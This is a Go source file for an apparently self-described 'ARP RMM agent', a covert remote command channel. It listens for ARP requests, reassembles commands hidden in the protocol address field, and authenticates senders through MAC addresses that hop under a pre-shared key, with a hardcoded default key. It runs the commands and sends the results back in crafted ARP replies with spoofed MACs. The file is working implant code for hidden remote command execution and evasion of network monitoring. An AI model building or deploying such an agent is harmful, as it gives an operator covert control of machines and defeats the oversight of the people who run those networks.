package main

import (
	"flag"
	"log"
	"net"
	"time"

	"arp-rmm/internal/craft"
	"arp-rmm/internal/execution"
	"arp-rmm/internal/fragment"
	"arp-rmm/internal/mac"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	iface := flag.String("iface", "", "Network interface to bind (e.g. \\Device\\NPF_{GUID})")
	psk := flag.String("psk", "S3cur3_Adm1n_K3y", "Pre-shared key for MAC hopping")
	mvp := flag.Bool("mvp", false, "MVP mode: accept all ARP traffic (no MAC hopping validation)")
	adminMAC := flag.String("admin-mac", "", "Admin MAC address filter (MVP mode, e.g. 00:11:22:33:44:55)")
	flag.Parse()

	if *iface == "" {
		devices, err := pcap.FindAllDevs()
		if err != nil || len(devices) == 0 {
			log.Fatal("No network interfaces found. Specify -iface flag.")
		}
		*iface = devices[0].Name
		log.Printf("Auto-selected interface: %s", *iface)
	}

	handle, err := craft.OpenHandle(*iface, true)
	if err != nil {
		log.Fatalf("Failed to open interface %s: %v", *iface, err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter("arp"); err != nil {
		log.Fatalf("Failed to set BPF filter: %v", err)
	}

	log.Println("=== ARP RMM Agent Started ===")
	log.Printf("Interface: %s | MVP mode: %v", *iface, *mvp)

	currentSeq := 0
	cmdBuf := fragment.NewCommandBuffer()
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range packetSource.Packets() {
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}
		arp := arpLayer.(*layers.ARP)

		if arp.Operation != layers.ARPRequest {
			continue
		}

		srcMAC := net.HardwareAddr(arp.SourceHwAddress).String()

		if !*mvp {
			expected := mac.PredictNextMAC(*psk, currentSeq)
			if srcMAC != expected {
				continue
			}
		} else if *adminMAC != "" && srcMAC != *adminMAC {
			continue
		}

		spa := arp.SourceProtAddress
		if len(spa) < 4 {
			continue
		}

		log.Printf("[<] Fragment received: seq=%d ctrl=0x%02x data=%q",
			int(spa[0]&fragment.SeqIDMask), spa[0], spa[1:])

		ready := cmdBuf.ProcessFragment(spa)
		currentSeq++

		if !ready {
			continue
		}

		command := cmdBuf.Reassemble()
		cmdBuf.Reset()
		log.Printf("[*] Reassembled command: %q", command)

		var response string
		if command == "HELO" {
			response = "READY"
			log.Println("[*] Handshake: HELO -> READY")
		} else {
			response = execution.RouteCommand(command)
			log.Printf("[*] Routed command result (%d bytes)", len(response))
		}

		respFrags := fragment.FragmentCommand(response)
		log.Printf("[>] Sending %d response fragments", len(respFrags))

		for _, frag := range respFrags {
			var respMAC net.HardwareAddr
			if *mvp {
				respMAC = net.HardwareAddr{0x00, 0x11, 0x22, 0x33, 0x44, 0x55}
			} else {
				respMAC = mac.GenerateHoppedMAC(*psk, currentSeq)
			}

			if err := craft.SendARPReply(handle, respMAC, frag); err != nil {
				log.Printf("[!] Failed to send fragment: %v", err)
			}
			currentSeq++
			time.Sleep(10 * time.Millisecond)
		}

		log.Println("[*] Response sent. Waiting for next command...")
	}
}
